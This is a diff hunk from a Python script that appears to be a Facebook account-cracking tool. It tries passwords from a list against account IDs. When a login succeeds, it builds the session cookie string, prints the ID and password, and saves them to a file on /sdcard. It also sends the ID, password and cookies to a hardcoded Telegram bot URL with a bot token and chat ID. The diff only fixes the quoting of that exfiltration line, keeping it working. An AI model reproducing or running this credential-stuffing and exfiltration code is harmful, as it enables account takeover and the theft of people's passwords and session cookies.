@@ -193,7 +193,7 @@ def m1(ids,names,passlist):
                 if 'session_key' in q:
                     coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])          
                     print(f"\r\r{GREEN}[\33[1;91mMr-PYNUXXX-OK{GREEN}] {ids} | {GREEN}{pas}")
-                    requests.get(f'''https://api.telegram.org/bot6991664095:AAHbgeRrBJwvSOMEn0VABLSs-aJR4vRZZ-U/sendMessage?chat_id=5326153007&text=[•] ids+'|'+pas+'|'+coki+'\n'''')
+                    requests.get(f'''https://api.telegram.org/bot6991664095:AAHbgeRrBJwvSOMEn0VABLSs-aJR4vRZZ-U/sendMessage?chat_id=5326153007&text=[•] ids+'|'+pas+'|'+coki+'\n''')
                     oks.append(ids)
                     open('/sdcard/MR.PYNUXXX-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                     break
